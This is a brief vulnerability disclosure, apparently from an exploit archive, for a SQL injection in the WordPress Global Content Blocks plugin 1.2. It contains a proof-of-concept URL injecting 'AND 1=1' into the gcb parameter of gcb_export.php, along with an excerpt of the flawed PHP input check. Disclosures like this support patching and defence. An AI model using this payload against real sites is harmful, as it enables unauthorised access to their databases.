# Date: 2011-08-18
# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
# Version: 1.2 (tested)
 
---
PoC
---
http://www.site.com/wp-content/plugins/global-content-blocks/gcb/gcb_export.php?gcb=1 AND 1=1
 
---------------
Vulnerable code
---------------
$ids = explode(";",$_GET["gcb"]);
$final_text = array();
 
foreach($ids as $id) {
    if(intval($id)>0) { // intval("1a") => 1 :)
        $final_text[] =
        base64_encode($entry->name)."<;>".
        base64_encode($entry->description)."<;>".
        base64_encode($entry->value)."<;>".
        base64_encode($entry->type);       
    }
}



